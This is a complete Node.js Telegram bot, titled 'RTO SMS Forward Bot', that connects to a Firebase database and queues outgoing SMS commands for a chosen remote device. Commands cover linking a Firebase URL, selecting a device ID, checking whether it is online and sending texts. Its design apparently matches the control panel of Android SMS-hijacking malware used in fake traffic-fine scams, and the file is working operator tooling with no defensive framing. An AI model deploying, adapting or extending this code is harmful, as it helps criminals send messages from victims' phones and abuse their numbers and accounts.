const fetch = require('node-fetch');
const fs = require('fs');
const path = require('path');

const BOT_TOKEN = process.env.BOT_TOKEN || 'YAHAN_APNA_TOKEN_DAALO';
const CONFIG_FILE = path.join(__dirname, 'user_config.json');
let userConfigs = {};

function loadConfigs() {
  try {
    if (fs.existsSync(CONFIG_FILE)) userConfigs = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8'));
  } catch (e) { userConfigs = {}; }
}
function saveConfigs() {
  try { fs.writeFileSync(CONFIG_FILE, JSON.stringify(userConfigs, null, 2)); } catch (e) {}
}
function getUserConfig(chatId) {
  if (!userConfigs[chatId]) userConfigs[chatId] = { firebaseUrl: null, deviceId: null, connected: false };
  return userConfigs[chatId];
}
async function sendMessage(chatId, text) {
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'HTML' })
    });
  } catch (e) { console.error(e.message); }
}
function normalizeUrl(url) {
  if (!url) return null;
  let u = url.trim().replace(/\/+$/, '');
  if (!u.startsWith('http')) u = 'https://' + u;
  return u.replace('.firebasedatabase.app', '.firebaseio.com');
}
async function fbPush(fbUrl, path, data) {
  const res = await fetch(`${fbUrl}/${path}.json`, {
    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data)
  });
  if (!res.ok) throw new Error(`HTTP ${res.status}`);
  return await res.json();
}
async function fbGet(fbUrl, path) {
  const res = await fetch(`${fbUrl}/${path}.json`);
  if (!res.ok) throw new Error(`HTTP ${res.status}`);
  return await res.json();
}
async function fbTest(fbUrl) {
  try {
    const res = await fetch(`${fbUrl}/.json?shallow=true`);
    if (!res.ok) return { ok: false, error: `HTTP ${res.status}` };
    return { ok: true, root: await res.json() };
  } catch (e) { return { ok: false, error: e.message }; }
}
async function deviceExists(fbUrl, id) {
  try { const d = await fbGet(fbUrl, `device_info/${id}`); return d !== null; } catch (e) { return false; }
}

async function cmdStart(chatId) {
  await sendMessage(chatId,
    `🤖 <b>RTO SMS Forward Bot</b>\n\n` +
    `<b>Commands:</b>\n` +
    `/connect &lt;firebase_url&gt;\n` +
    `/device &lt;device_id&gt;\n` +
    `/status\n` +
    `/disconnect\n\n` +
    `<b>SMS bhejo:</b>\n` +
    `<code>TO: 9876543210, BODY: Hello</code>`
  );
}
async function cmdConnect(chatId, args) {
  if (!args[0]) { await sendMessage(chatId, `❌ Use: /connect https://xxx.firebaseio.com`); return; }
  const fbUrl = normalizeUrl(args[0]);
  await sendMessage(chatId, `⏳ Connecting...`);
  const test = await fbTest(fbUrl);
  if (!test.ok) { await sendMessage(chatId, `❌ Failed: ${test.error}`); return; }
  const cfg = getUserConfig(chatId);
  cfg.firebaseUrl = fbUrl; cfg.connected = true; saveConfigs();
  const keys = test.root ? Object.keys(test.root) : [];
  await sendMessage(chatId, `✅ Connected!\n🔗 <code>${fbUrl}</code>\n📊 Nodes: ${keys.slice(0,5).join(', ')}\n\nAb /device set karo`);
}
async function cmdDevice(chatId, args) {
  const cfg = getUserConfig(chatId);
  if (!cfg.connected) { await sendMessage(chatId, `❌ Pehle /connect karo!`); return; }
  if (!args[0]) { await sendMessage(chatId, `❌ Use: /device DEV_ABC123`); return; }
  const id = args[0].trim();
  await sendMessage(chatId, `⏳ Checking...`);
  const exists = await deviceExists(cfg.firebaseUrl, id);
  cfg.deviceId = id; saveConfigs();
  await sendMessage(chatId, `✅ Device Set!\n📱 <code>${id}</code>\n📡 ${exists ? '🟢 Online' : '🔴 Offline'}\n\nAb SMS bhejo:\n<code>TO: 9876543210, BODY: Hi</code>`);
}
async function cmdStatus(chatId) {
  const cfg = getUserConfig(chatId);
  let s = `📊 <b>Status</b>\n\n`;
  s += `🔗 Firebase: ${cfg.firebaseUrl ? '✅ <code>'+cfg.firebaseUrl+'</code>' : '❌'}\n`;
  s += `📱 Device: ${cfg.deviceId ? '✅ <code>'+cfg.deviceId+'</code>' : '❌'}\n`;
  if (cfg.firebaseUrl && cfg.deviceId) {
    const on = await deviceExists(cfg.firebaseUrl, cfg.deviceId);
    s += `📡 Live: ${on ? '🟢 Online' : '🔴 Offline'}\n`;
  }
  await sendMessage(chatId, s);
}
async function cmdDisconnect(chatId) {
  userConfigs[chatId] = { firebaseUrl: null, deviceId: null, connected: false };
  saveConfigs();
  await sendMessage(chatId, `✅ Disconnected!`);
}
async function handleSms(chatId, text) {
  const cfg = getUserConfig(chatId);
  if (!cfg.firebaseUrl) { await sendMessage(chatId, `❌ Pehle /connect!`); return; }
  if (!cfg.deviceId) { await sendMessage(chatId, `❌ Pehle /device!`); return; }
  const toM = text.match(/TO[:\s]+([+\d]+)/i);
  const bodyM = text.match(/BODY[:\s]+([\s\S]+)/i);
  if (!toM || !bodyM) { await sendMessage(chatId, `⚠️ Format: <code>TO: 9876543210, BODY: Hi</code>`); return; }
  await sendMessage(chatId, `⏳ Bhej raha hoon...`);
  try {
    const r = await fbPush(cfg.firebaseUrl, `device_info/${cfg.deviceId}/sms_commands`, {
      to: toM[1].trim(), message: bodyM[1].trim(), sim_slot: 1,
      status: 'pending', timestamp: Date.now(), source: 'telegram_bot'
    });
    await sendMessage(chatId, `✅ Queued!\n📱 To: <code>${toM[1]}</code>\n📝 ${bodyM[1].substring(0,80)}\n🆔 ${r.name || 'ok'}`);
  } catch (e) { await sendMessage(chatId, `❌ ${e.message}`); }
}
async function handleMessage(chatId, text) {
  console.log(`📩 ${text.substring(0,80)}`);
  const parts = text.trim().split(/\s+/);
  const cmd = parts[0].toLowerCase();
  const args = parts.slice(1);
  if (cmd === '/start' || cmd === '/help') return cmdStart(chatId);
  if (cmd === '/connect') return cmdConnect(chatId, args);
  if (cmd === '/device') return cmdDevice(chatId, args);
  if (cmd === '/status') return cmdStatus(chatId);
  if (cmd === '/disconnect') return cmdDisconnect(chatId);
  if (/TO[:\s]+\d/i.test(text)) return handleSms(chatId, text);
  await sendMessage(chatId, `❓ /help bhejo`);
}
let lastUpdateId = 0;
async function poll() {
  try {
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?timeout=30&offset=${lastUpdateId+1}`);
    const data = await res.json();
    if (data.ok && data.result) {
      for (const u of data.result) {
        lastUpdateId = u.update_id;
        if (u.message && u.message.text) {
          try { await handleMessage(u.message.chat.id, u.message.text); }
          catch (e) { await sendMessage(u.message.chat.id, `❌ ${e.message}`); }
        }
      }
    }
  } catch (e) { console.error(e.message); }
  setTimeout(poll, 1000);
}
loadConfigs();
console.log('🤖 Bot started!');
poll();
